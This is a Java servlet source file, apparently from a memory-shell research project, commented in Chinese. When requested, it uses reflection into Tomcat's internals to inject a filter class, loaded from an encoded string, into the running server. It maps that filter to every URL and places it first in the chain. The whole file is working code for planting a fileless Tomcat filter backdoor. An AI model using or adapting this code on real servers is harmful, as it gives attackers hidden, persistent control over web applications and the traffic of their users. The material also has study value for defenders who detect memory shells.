package org.su18.memshell.test.tomcat;

import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import static org.su18.memshell.test.tomcat.DynamicUtils.FILTER_CLASS_STRING;

/**
 * 访问这个 Servlet 将会动态添加自定义 Filter
 * 测试版本 Tomcat 8.5.31
 * Tomcat 7 包位置不同
 * import org.apache.catalina.deploy.FilterDef;
 * import org.apache.catalina.deploy.FilterMap;
 *
 * @author su18
 */
public class AddTomcatFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {

			String filterName = "su18Filter";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 filterName 的 Filter，则不再重复添加
			if (servletContext.getFilterRegistration(filterName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					if (object instanceof ServletContext) {
						servletContext = (ServletContext) object;
					} else if (object instanceof StandardContext) {
						o = (StandardContext) object;
					}
				}

				// 创建自定义 Filter 对象
				Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);

				// 创建 FilterDef 对象
				FilterDef filterDef = new FilterDef();
				filterDef.setFilterName(filterName);
				filterDef.setFilter((Filter) filterClass.newInstance());
				filterDef.setFilterClass(filterClass.getName());

				// 创建 ApplicationFilterConfig 对象
				Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
				constructor[0].setAccessible(true);
				ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);

				// 创建 FilterMap 对象
				FilterMap filterMap = new FilterMap();
				filterMap.setFilterName(filterName);
				filterMap.addURLPattern("*");
				filterMap.setDispatcher(DispatcherType.REQUEST.name());


				// 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
				Field filterConfigsField = o.getClass().getDeclaredField("filterConfigs");
				filterConfigsField.setAccessible(true);
				HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(o);
				filterConfigs.put(filterName, config);

				// 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
				Field filterMapField = o.getClass().getDeclaredField("filterMaps");
				filterMapField.setAccessible(true);
				Object object = filterMapField.get(o);

				Class cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
				// addBefore 将 filter 放在第一位
				Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
//				Method m = cl.getDeclaredMethod("add", FilterMap.class);
				m.setAccessible(true);
				m.invoke(object, filterMap);

				PrintWriter writer = resp.getWriter();
				writer.println("tomcat filter added");

			}
		} catch (Exception e) {
			e.printStackTrace();
		}


	}
}
